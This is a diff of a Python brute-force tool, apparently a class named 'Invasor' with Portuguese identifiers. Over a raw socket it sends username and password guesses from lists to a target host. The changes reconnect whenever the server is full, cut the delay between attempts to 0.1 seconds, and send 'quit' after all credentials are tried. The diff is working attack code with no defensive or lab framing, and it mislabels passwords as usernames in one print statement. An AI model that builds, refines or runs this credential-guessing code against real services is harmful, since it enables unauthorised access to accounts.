@@ -16,6 +16,8 @@ class Invasor:
                 self.lista_de_senhas.append(senha)
 
 
+
+
         self.invasor.connect((self.host,self.porta))
         index_nomes_atual=0
         index_senha_atual=0
@@ -36,11 +38,26 @@ class Invasor:
                 print (f'Enviado usuario {self.lista_de_senhas[index_senha_atual]}')
                 index_nomes_atual+=1
             else:
-                print('Esperando uma conexão ser liberada...')
-                time.sleep(10)
-            
+                self.invasor.close()
+                self.invasor_esperando=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                print ('servidor lotado. Esperando liberar...')
+                time.sleep(2)
+                while True:
+                    try:
+                        self.invasor_esperando.connect((self.host,self.porta))
+                        self.invasor=self.invasor_esperando
+                        break
+                    except:
+                        time.sleep(2)
+                        break
+
+                        
             #tempo de espera por visibilidade
-            time.sleep(0.2)
+            time.sleep(0.1)
+        
+        print ('Todas os nomes e senhas testados. ')
+        self.invasor.send(('quit').encode())
+
             
 
 
